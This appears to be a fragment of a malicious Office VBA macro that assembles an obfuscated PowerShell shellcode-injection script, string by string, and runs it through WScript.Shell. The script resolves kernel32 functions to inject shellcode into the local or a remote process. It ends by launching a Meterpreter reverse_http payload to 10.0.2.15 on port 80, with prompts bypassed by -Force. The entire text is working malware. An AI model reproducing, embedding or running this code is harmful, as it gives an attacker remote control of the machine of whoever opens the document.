        $CreateRemoteThreadAddr"
        PIq = PIq + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        PIq = PIq + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        PIq = PIq + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        PIq = PIq + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        PIq = PIq + "eateRemoteThread = [System.Runtime.InteropServices"
        PIq = PIq + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        PIq = PIq + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        PIq = PIq + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        PIq = PIq + " CloseHandle
        $CloseHandleDelegate = Get-De"
        PIq = PIq + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        PIq = PIq + "le = [System.Runtime.InteropServices.Marshal]::Get"
        PIq = PIq + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        PIq = PIq + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        PIq = PIq + ".ShouldContinue( 'Do you wish to carry out your ev"
        PIq = PIq + "il plans?',
                 "Injecting shellcode "
        PIq = PIq + "injecting into $((Get-Process -Id $ProcessId).Proc"
        PIq = PIq + "essName) ($ProcessId)!" ) )
        {
            "
        PIq = PIq + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        PIq = PIq + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        PIq = PIq + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        PIq = PIq + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        PIq = PIq + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        PIq = PIq + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        PIq = PIq + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        PIq = PIq + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        PIq = PIq + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        PIq = PIq + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        PIq = PIq + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        PIq = PIq + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        PIq = PIq + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        PIq = PIq + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        PIq = PIq + "rocAddress kernel32.dll CreateThread
        $Crea"
        PIq = PIq + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        PIq = PIq + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        PIq = PIq + "IntPtr])
        $CreateThread = [System.Runtime.I"
        PIq = PIq + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        PIq = PIq + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        PIq = PIq + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        PIq = PIq + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        PIq = PIq + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        PIq = PIq + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        PIq = PIq + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        PIq = PIq + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        PIq = PIq + "ForSingleObjectDelegate)
        if ( $Force -or $"
        PIq = PIq + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        PIq = PIq + " your evil plans?',
                 "Injecting sh"
        PIq = PIq + "ellcode into the running PowerShell process!" ) )
"
        PIq = PIq + "        {
            Inject-LocalShellcode
      "
        PIq = PIq + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        PIq = PIq + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        PIq = PIq + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(PIq)
End Function
